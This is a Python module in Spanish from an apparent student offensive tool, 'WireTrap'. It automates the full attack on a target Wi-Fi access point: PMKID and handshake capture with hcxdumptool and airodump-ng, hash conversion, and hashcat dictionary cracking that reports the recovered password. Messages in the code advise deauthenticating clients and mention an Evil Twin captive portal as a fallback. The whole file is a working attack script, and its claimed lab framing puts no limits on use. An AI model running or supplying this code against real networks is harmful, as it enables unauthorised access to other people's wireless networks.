"""
core/wpa2_crypto.py — WireTrap WPA2/WPA3 Cracking Module

Flujo:
  1. PMKID Attack (hcxdumptool): captura el PMKID del AP sin necesidad de clientes conectados.
     Es la primera línea de ataque. El timeout auto-para la captura.
  2. Handshake Capture (airodump-ng): captura el 4-way handshake esperando o forzando
     que un cliente se autentique. Requiere clientes activos.
  3. Hash Conversion (hcxpcapngtool): convierte .pcapng → .hc22000.
  4. Cracking (hashcat -m 22000): aplica el diccionario sobre el hash extraído.

Problemas del código anterior corregidos:
  - hcxdumptool no recibía el filtro de BSSID (--filterlist_ap).
  - El proceso nunca tenía condición de parada (timeout necesario).
  - Hashcat colgaba en VM sin --force.
  - No había modo fallback con airodump-ng.
  - La detección de PMKID/Handshake en el output era frágil.
"""

import subprocess
import threading
import os
import signal
import time
import re


# ──────────────────────────────────────────────────────────────────────────────
# Constantes de rutas temporales
# ──────────────────────────────────────────────────────────────────────────────
TMP_DIR         = "/tmp/wiretrap_crack"
PMKID_PCAPNG    = os.path.join(TMP_DIR, "pmkid_capture.pcapng")
HS_CAP          = os.path.join(TMP_DIR, "handshake")        # airodump añade sufijos
HS_CAP_FILE     = os.path.join(TMP_DIR, "handshake-01.cap")
HASH_FILE       = os.path.join(TMP_DIR, "target.hc22000")
FILTER_FILE     = os.path.join(TMP_DIR, "bssid_filter.txt")

PMKID_TIMEOUT   = 90   # segundos máximo buscando PMKID antes de rendirse


class WPA2CrackModule:
    """
    Módulo de cracking WPA2/WPA3. Diseñado para entornos de lab controlados (TFG).

    Uso básico:
        m = WPA2CrackModule(interface="wlan0mon")
        m.on_log     = lambda msg: print(msg)
        m.on_success = lambda pw: print("Password:", pw)
        m.on_error   = lambda err: print("ERROR:", err)
        m.wordlist   = "/usr/share/wordlists/rockyou.txt"
        m.start_pmkid_attack("AA:BB:CC:DD:EE:FF")
    """

    def __init__(self, interface: str):
        self.interface = interface
        self.wordlist  = ""
        self.running   = False
        self._process  = None
        self._thread   = None

        # Callbacks — todos opcionales
        self.on_log          = None   # fn(str)
        self.on_hash_ready   = None   # fn(str)   — ruta al .hc22000
        self.on_success      = None   # fn(str)   — contraseña encontrada
        self.on_error        = None   # fn(str)
        self.on_stopped      = None   # fn()

        os.makedirs(TMP_DIR, exist_ok=True)

    # ──────────────────────────────────────────────────────────────────────────
    # API pública
    # ──────────────────────────────────────────────────────────────────────────

    def start_pmkid_attack(self, target_bssid: str):
        """Lanza captura PMKID contra un AP específico (no necesita clientes)."""
        if self.running:
            return
        self._clean_tmp_files()
        self.running = True
        self._thread = threading.Thread(
            target=self._pmkid_worker,
            args=(target_bssid,),
            daemon=True
        )
        self._thread.start()

    def start_handshake_capture(self, target_bssid: str, channel: int):
        """Lanza captura de handshake tradicional con airodump-ng."""
        if self.running:
            return
        self._clean_tmp_files()
        self.running = True
        self._thread = threading.Thread(
            target=self._handshake_worker,
            args=(target_bssid, channel),
            daemon=True
        )
        self._thread.start()

    def crack_existing_hash(self, hash_path: str = None):
        """Lanza hashcat directamente sobre un .hc22000 ya existente."""
        path = hash_path or HASH_FILE
        if not os.path.exists(path) or os.path.getsize(path) == 0:
            self._emit_error(f"Hash file no encontrado o vacío: {path}")
            return
        if not self.wordlist:
            self._emit_error("No se ha especificado un wordlist para hashcat.")
            return
        self._thread = threading.Thread(
            target=self._run_hashcat,
            args=(path,),
            daemon=True
        )
        self._thread.start()

    def stop(self):
        self.running = False
        self._kill_process()

    # ──────────────────────────────────────────────────────────────────────────
    # Worker PMKID (hcxdumptool)
    # ──────────────────────────────────────────────────────────────────────────

    def _pmkid_worker(self, target_bssid: str):
        bssid_clean = target_bssid.replace(":", "").lower()

        # hcxdumptool 7.1.x usa BPF para filtrar por BSSID (addr3 = BSSID en mgmt frames)
        # Compilar el filtro BPF y guardarlo en archivo
        bpf_expr = f"wlan addr3 {bssid_clean}"
        bpf_compile_cmd = ["hcxdumptool", f"--bpfc={bpf_expr}"]
        try:
            bpf_result = subprocess.run(bpf_compile_cmd, capture_output=True, text=True)
            bpf_code = bpf_result.stdout.strip()
            if not bpf_code:
                bpf_code = bpf_result.stderr.strip()
            with open(FILTER_FILE, "w") as f:
                f.write(bpf_code + "\n")
            self._log(f"[*] BPF filter compilado para {target_bssid}")
        except Exception as e:
            self._log(f"[!] No se pudo compilar BPF, capturando sin filtro: {e}")
            FILTER_FILE_USE = None
        else:
            FILTER_FILE_USE = FILTER_FILE

        cmd = [
            "hcxdumptool",
            "-i", self.interface,
            "-w", PMKID_PCAPNG,
            "--rds=2",
            "--exitoneapol=1",
            f"--tot={PMKID_TIMEOUT // 60 + 1}",
        ]
        if FILTER_FILE_USE and bpf_code:
            cmd += ["--bpf", FILTER_FILE_USE]

        self._log(f"[*] PMKID Attack → BSSID: {target_bssid}")
        self._log(f"[*] Timeout: {PMKID_TIMEOUT}s. Capturando hash WPA2...")

        start_time = time.time()

        try:
            self._process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                preexec_fn=os.setsid
            )

            for line in self._process.stdout:
                if not self.running:
                    break

                line = line.strip()
                if not line:
                    continue

                # Filtrar líneas de status periódico
                if re.match(r"^\d+\s+packets", line) or "tx=" in line:
                    continue

                self._log(f"[HCX] {line}")

                # Detectar PMKID/Handshake capturado
                if "PMKID" in line.upper() or "M1M2" in line.upper() or "EAPOL" in line.upper():
                    self._log("[+] ¡PMKID/Handshake detectado!")
                    break

                # Timeout
                if time.time() - start_time > PMKID_TIMEOUT:
                    self._log(f"[!] Timeout de {PMKID_TIMEOUT}s alcanzado.")
                    break

        except FileNotFoundError:
            self._emit_error("hcxdumptool no encontrado.\n  sudo apt install hcxdumptool")
            self.running = False
            if self.on_stopped:
                self.on_stopped()
            return
        except Exception as e:
            self._emit_error(f"Error en hcxdumptool: {e}")
        finally:
            self._kill_process()

        self._log("[*] Procesando captura...")
        self._convert_generic(PMKID_PCAPNG)

        self.running = False
        if self.on_stopped:
            self.on_stopped()

    # ──────────────────────────────────────────────────────────────────────────
    # Worker Handshake (airodump-ng)
    # ──────────────────────────────────────────────────────────────────────────

    def _handshake_worker(self, target_bssid: str, channel: int):
        self._log(f"[*] Handshake Capture → BSSID: {target_bssid} | Canal: {channel}")
        self._log(f"[!] TIP: Usa el módulo Deauth para forzar reconexión del cliente.")

        cmd = [
            "airodump-ng",
            "--bssid",    target_bssid,
            "--channel",  str(channel),
            "--write",    HS_CAP,
            "--output-format", "cap",
            "--write-interval", "1",
            self.interface
        ]

        hs_timeout = 120
        start_time = time.time()
        hs_found   = False

        try:
            self._process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                preexec_fn=os.setsid
            )

            while self.running:
                time.sleep(2)

                if os.path.exists(HS_CAP_FILE) and os.path.getsize(HS_CAP_FILE) > 200:
                    if self._check_handshake_in_cap(HS_CAP_FILE):
                        self._log("[+] ¡Handshake WPA2 capturado!")
                        hs_found = True
                        break

                if time.time() - start_time > hs_timeout:
                    self._log(f"[!] Timeout de {hs_timeout}s. No se capturó handshake.")
                    break

                elapsed = int(time.time() - start_time)
                self._log(f"[~] Esperando handshake... ({elapsed}s/{hs_timeout}s)")

        except FileNotFoundError:
            self._emit_error("airodump-ng no encontrado.\n  sudo apt install aircrack-ng")
            self.running = False
            if self.on_stopped:
                self.on_stopped()
            return
        except Exception as e:
            self._emit_error(f"Error en airodump-ng: {e}")
        finally:
            self._kill_process()

        if hs_found:
            self._convert_generic(HS_CAP_FILE)
        else:
            self._emit_error(
                "No se capturó handshake.\n"
                "Prueba el ataque PMKID o fuerza deauth para reconexión del cliente."
            )

        self.running = False
        if self.on_stopped:
            self.on_stopped()

    def _check_handshake_in_cap(self, cap_file: str) -> bool:
        """Comprueba si hay handshake válido usando hcxpcapngtool."""
        try:
            test_hash = os.path.join(TMP_DIR, "_test_hs.hc22000")
            subprocess.run(
                ["hcxpcapngtool", "-o", test_hash, cap_file],
                capture_output=True, text=True, timeout=10
            )
            if os.path.exists(test_hash) and os.path.getsize(test_hash) > 0:
                os.remove(test_hash)
                return True
        except Exception:
            pass
        return False

    # ──────────────────────────────────────────────────────────────────────────
    # Conversión → hc22000
    # ──────────────────────────────────────────────────────────────────────────

    def _convert_generic(self, input_file: str):
        if not os.path.exists(input_file):
            self._emit_error(f"Archivo de captura no encontrado: {input_file}")
            return
        if os.path.getsize(input_file) < 50:
            self._emit_error("El archivo de captura está vacío.")
            return

        self._log("[*] Convirtiendo a formato HC22000...")

        try:
            res = subprocess.run(
                ["hcxpcapngtool", "-o", HASH_FILE, input_file],
                capture_output=True, text=True, timeout=30
            )

            full_output = (res.stdout + res.stderr).strip()
            for line in full_output.splitlines():
                line = line.strip()
                if any(kw in line for kw in ["PMKID", "EAPOL", "written", "hash", "WPA"]):
                    self._log(f"  ↳ {line}")

            if os.path.exists(HASH_FILE) and os.path.getsize(HASH_FILE) > 0:
                self._log(f"[✓] Hash extraído → {HASH_FILE}")
                if self.on_hash_ready:
                    self.on_hash_ready(HASH_FILE)
                if self.wordlist:
                    self._run_hashcat(HASH_FILE)
            else:
                self._emit_error(
                    "La captura no contiene PMKIDs ni Handshakes válidos.\n"
                    "El AP puede usar WPA3-SAE puro o PMF obligatorio.\n"
                    "Alternativa: Evil Twin + Portal Cautivo para captura directa."
                )
        except FileNotFoundError:
            self._emit_error("hcxpcapngtool no encontrado.\n  sudo apt install hcxtools")
        except subprocess.TimeoutExpired:
            self._emit_error("hcxpcapngtool tardó demasiado. Archivo posiblemente corrupto.")
        except Exception as e:
            self._emit_error(f"Error en hcxpcapngtool: {e}")

    # ──────────────────────────────────────────────────────────────────────────
    # Hashcat
    # ──────────────────────────────────────────────────────────────────────────

    def _run_hashcat(self, hash_file: str):
        if not self.wordlist or not os.path.exists(self.wordlist):
            self._emit_error(
                f"Wordlist no válido: '{self.wordlist}'\n"
                "Especifica la ruta antes de crackear."
            )
            return

        self._log(f"\n[*] Iniciando hashcat (modo diccionario)...")
        self._log(f"    Hash:     {hash_file}")
        self._log(f"    Wordlist: {self.wordlist}")

        potfile = os.path.join(TMP_DIR, "hashcat.pot")

        cmd = [
            "hashcat",
            "-m", "22000",
            "-a", "0",
            "--force",              # Necesario en VM sin GPU dedicada
            "--potfile-path", potfile,
            "--status",
            "--status-timer", "10",
            hash_file,
            self.wordlist
        ]

        password_found = None

        try:
            hc_proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )
            self._process = hc_proc

            for line in hc_proc.stdout:
                line = line.strip()
                if not line:
                    continue

                if "Status.........: Cracked" in line:
                    self._log("[+] ¡Estado: CRACKEADO!")

                # Filtrar spam de hardware info
                if any(skip in line for skip in [
                    "Watchdog:", "Hardware Mon.", "OpenCL Info",
                    "* Device #", "Minimum password", "Cache Hit", "Bypass"
                ]):
                    continue

                self._log(f"  {line}")

            hc_proc.wait()

            # Leer potfile para extraer la contraseña
            if os.path.exists(potfile) and os.path.getsize(potfile) > 0:
                with open(potfile) as pf:
                    for line in pf:
                        line = line.strip()
                        if ":" in line:
                            password_found = line.split(":")[-1]
                            break

            if password_found:
                self._log(f"\n[★] ¡CONTRASEÑA ENCONTRADA! → {password_found}")
                if self.on_success:
                    self.on_success(password_found)
            else:
                self._log("[!] Hashcat terminó sin encontrar la contraseña.")
                self._log("    Prueba con rockyou.txt u otro wordlist mayor.")

        except FileNotFoundError:
            self._emit_error("hashcat no encontrado.\n  sudo apt install hashcat")
        except Exception as e:
            self._emit_error(f"Error en hashcat: {e}")
        finally:
            self._process = None

    # ──────────────────────────────────────────────────────────────────────────
    # Utilidades
    # ──────────────────────────────────────────────────────────────────────────

    def _log(self, msg: str):
        if self.on_log:
            self.on_log(msg)

    def _emit_error(self, msg: str):
        self._log(f"[✗] {msg}")
        if self.on_error:
            self.on_error(msg)

    def _kill_process(self):
        if self._process:
            try:
                os.killpg(os.getpgid(self._process.pid), signal.SIGTERM)
                self._process.wait(timeout=3)
            except Exception:
                try:
                    self._process.kill()
                except Exception:
                    pass
            finally:
                self._process = None

    def _clean_tmp_files(self):
        for f in [PMKID_PCAPNG, HS_CAP_FILE, HASH_FILE, FILTER_FILE]:
            if os.path.exists(f):
                try:
                    os.remove(f)
                except Exception:
                    pass

    @staticmethod
    def check_dependencies() -> dict:
        """Comprueba qué herramientas están disponibles en el sistema."""
        tools = ["hcxdumptool", "hcxpcapngtool", "hashcat", "airodump-ng"]
        result = {}
        for tool in tools:
            try:
                subprocess.run([tool, "--version"], capture_output=True, timeout=3)
                result[tool] = True
            except (FileNotFoundError, subprocess.TimeoutExpired):
                result[tool] = False
        return result

# Alias de compatibilidad con la GUI actual
WPA2Crypto = WPA2CrackModule
